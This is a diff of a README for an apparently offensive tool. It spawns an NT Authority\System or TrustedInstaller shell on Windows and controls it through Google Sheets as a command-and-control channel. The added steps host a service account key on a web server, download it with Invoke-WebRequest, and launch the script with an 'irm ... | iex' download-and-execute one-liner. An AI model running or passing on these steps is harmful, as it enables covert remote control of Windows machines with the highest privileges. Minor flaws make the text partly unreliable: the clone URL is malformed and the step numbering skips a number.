@@ -1,33 +1,56 @@
 # TrustedInstallerPOC-GC2-Sheet
 
-A simple Proof of Concept in Go to spawn a new shell as TrustedInstaller. Read more about how this PoC works on this [blog about TrustedInstaller](https://fourcore.io/blogs/no-more-access-denied-i-am-trustedinstaller). It is important to note that this should be executed as a user which has SeDebugPrivileges. Upon execution, it will automatically ask for UAC in case it is not executed as as an Administrator.
+A simple Proof of Concept in Powershell/Go to spawn a new shell as NT Authority\System using Google Sheets as a C2 interface. Read more about how this PoC works on this [blog about TrustedInstaller](https://fourcore.io/blogs/no-more-access-denied-i-am-trustedinstaller) and [GC2-sheet](https://github.com/looCiprian/GC2-sheet). It is important to note that this should be executed as a user which has SeDebugPrivileges. This repository leverages forked repositories: looCiprian/GC2-sheet and FourCoreLabs/TrustedInstallerPOC.
+
+## Configuration
+
+The Powershell script ti2.ps1 pulls nathansb2022/GC2-sheet-Scripted and nathansb2022/TrustedInstallerPOC-GC2-Sheet as .zip files. Additionally, ti2.ps1 is configured to pull your Google service account .json key. See below for alternative method. For Google Sheets and Drive setup reference [GC2-Sheet-Scripted](https://github.com/nathansb2022/GC2-sheet-Scripted).
 
 ## POC
 
 1. Clone the repository
 
 ```
-$ git clone https://github.com/FourCoreLabs/TrustedInstallerPOC.git
+$ git clone https://github.com/nathansb2022TrustedInstallerPOC-GC2-Sheet.git
 ```
 
-2. Ensure you have Go installed. This POC has been tested on Go 1.19.
-3. Either build the binary and execute it
+2. Ensure you have a web server hosting your Google service account .json key or drop in GC2-Sheet-Scripted-Master
 
 ```
-$ go build ti
-$ ./ti.exe
+$ python3 -m uploadserver 80
 ```
 
-4. Or run it directly
+3. Optional: If you are adding the .json key manually remove line 42 from ti2.ps1
 
 ```
-$ go run ti
+Invoke-WebRequest -Uri $keyFileUrl -UseBasicParsing -OutFile ".\master\GC2-sheet-Scripted-master\$myKey"
+```
+
+4. Edit ti2.ps1 and define variables
+
+```
+$myUrl = ""
+$myKey = ""
+$mySheetId = ""
+$myDriveId = ""
+```
+
+6. Either call the ti2.ps1 or execute it in go
+
+```
+$ .\ti2.ps1
+```
+```
+$ irm http://$myUrl/ti2.ps1 | iex
+```
+```
+$ go run ti $myKey $mySheetId $myDriveId
 ```
 
 
-This will spawn a new cmd shell with TrustedInstaller privileges which can be confirmed by running the command `whoami /all`
+This will spawn a new cmd shell with TrustedInstaller privileges in Google Sheets which can be confirmed by running the command `whoami /all`
 
-![demo](https://user-images.githubusercontent.com/26490648/219342533-79d0cf34-0bf2-4f63-b805-34fca5aff012.gif)
+![Alt text](https://assets.digitalocean.com/articles/alligator/boo.svg "NT Authority\System")
 
 ## API
 
